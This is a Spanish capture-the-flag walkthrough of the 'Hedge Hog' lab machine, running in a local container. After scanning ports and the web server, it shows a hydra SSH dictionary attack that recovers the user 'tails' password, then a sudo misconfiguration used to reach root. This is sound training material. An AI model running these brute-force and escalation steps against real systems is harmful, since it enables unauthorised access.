- Tags: #HedgeHog
----
- [Maquian Hedge Hog](https://mega.nz/file/ic9VwYZJ#Hr1BjW2axoSRmUYbxhldmTNiYtBV9TQU83JDJPpoYww) ==> Enlace al laboratori, una ves descargado descomprimimos y desplegamos el laboratorio:
```bash
7z x hedgehog.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh hedgehog.tar # Desplegamos el laboratorio.
```
---
- #### Fase Reconocimiento:
```bash
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para determinar si podemos comunicarnos con el target

 wichSystem.py 172.17.0.2 # Logramos determinar gracias al ttl que estamoa ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```
---

- #### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts 
extractPorts allPorts # Usamos nuestra utilidad para parsear la informacion mas importante.
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la version que corren detras de estos puertos.
nmap --script http-enum -p80 172.17.0.2 # Realizamos reconocimiento pero no reporta nada critico
```
---
- **(  22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) )** ==> Tenemos una version de ssh.
- **( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** ==> Tenemos un servico apache desplegado por el puerto 80 del servidor, Por el codeName: **( Apache httpd 2.4.58 )** buscamos en la web **launchPad** que nos muestra que estamos ante una version: **( ubuntuNoble )**
----

- #### Fase Reconocimiento Web:
- **( http://172.17.0.2/ )** ==> Ingresamos al servicio web,
```bash
whatweb http://172.17.0.2 # Realizamos reconocimiento de las tecnologias. asi mismo wappyalyzer no nos reporta mucha informacion
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2]
```
---
- Realizaremos reconocimiento de rutas y subdominios en el **target**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash # No reporto directorios
```
---
- Una ves realizado todas las posibles rutas y subdominios procedemos y no encontrando nada.
- **( tails )** ==> Tenemos este, Intentaremos ver si es algun usuario valido para el sistema
```bash
 hydra -l tails -P /usr/share/wordlists/rockyou.txt -t -f 64 ssh://172.17.0.2 # Aplicamos ataque de diccionario obteniendo la password valida. ( 3117548331 )

ssh-keygen -R 172.17.0.2 && ssh tails@172.17.0.2 -p 22 # Nos conectamos con este usuario y proporcionamos la password.
```
---

- #### Escalada Privilegios:
```bash
sudo -l
User tails may run the following commands on c13b4989963a:
    (sonic) NOPASSWD: ALL
```
---
- **( sonic )** ==>  Tenemos este usuario que puede ejecutar cualquier comando sin proporcionar password.
```bash
sudo -u sonic sudo su # Logramos elevar nuestro privilegio a root
```